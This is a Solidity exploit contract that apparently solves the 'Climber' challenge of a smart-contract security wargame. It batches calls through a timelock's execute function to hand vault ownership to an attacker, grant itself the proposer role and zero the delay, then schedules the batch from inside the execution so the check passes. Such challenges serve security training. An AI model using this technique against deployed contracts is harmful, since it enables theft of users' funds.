// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";

contract ClimberExploit {
    address payable private timelock;
    address private vault;
    address private attacker;

    address[] private targets;
    uint256[] private values;
    bytes[] private dataElements;

    constructor(
        address payable timelockAddress,
        address vaultAddress,
        address attackerAddress
    ) {
        timelock = timelockAddress;
        vault = vaultAddress;
        attacker = attackerAddress;
    }

    function attack() external {
        targets.push(vault);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );

        bytes32 PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
        targets.push(timelock);
        values.push(0);
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            )
        );

        targets.push(timelock);
        values.push(0);
        dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", 0));

        targets.push(address(this));
        values.push(0);
        dataElements.push(abi.encodeWithSignature("scheduleProxy()"));

        ClimberTimelock(timelock).execute(targets, values, dataElements, 0);
    }

    function scheduleProxy() external {
        ClimberTimelock(timelock).schedule(targets, values, dataElements, 0);
    }
}
